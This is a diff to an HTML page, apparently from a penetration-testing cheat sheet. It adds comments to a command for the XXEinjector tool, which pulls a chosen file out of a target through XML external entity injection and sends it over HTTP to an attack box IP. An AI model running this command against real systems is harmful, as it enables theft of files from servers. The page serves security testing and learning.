@@ -64,7 +64,10 @@ XXEINJECT
 
 <h2>commands</h2>
 
-<div class="highlight"><pre class="highlight shell"><code>xxe_injector <span class="nt">--host</span><span class="o">=</span>&lt;attack box IP&gt; <span class="nt">--httpport</span><span class="o">=</span>&lt;attack box port&gt; <span class="nt">--file</span><span class="o">=</span>&lt;request file&gt; <span class="nt">--path</span><span class="o">=</span>&lt;file to exfiltrate&gt; <span class="nt">--oob</span><span class="o">=</span>http <span class="nt">--phpfilter</span>
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># try to exfiltrate a file with XXE.</span>
+<span class="c"># exfiltrated files get stored in the</span>
+<span class="c"># 'Logs' folder under XXEinjector:</span>
+xxe_injector <span class="nt">--host</span><span class="o">=</span>&lt;attack box IP&gt; <span class="nt">--httpport</span><span class="o">=</span>&lt;attack box port&gt; <span class="nt">--file</span><span class="o">=</span>&lt;request file&gt; <span class="nt">--path</span><span class="o">=</span>&lt;file to exfiltrate&gt; <span class="nt">--oob</span><span class="o">=</span>http <span class="nt">--phpfilter</span>
 </code></pre></div>
 
     </main>
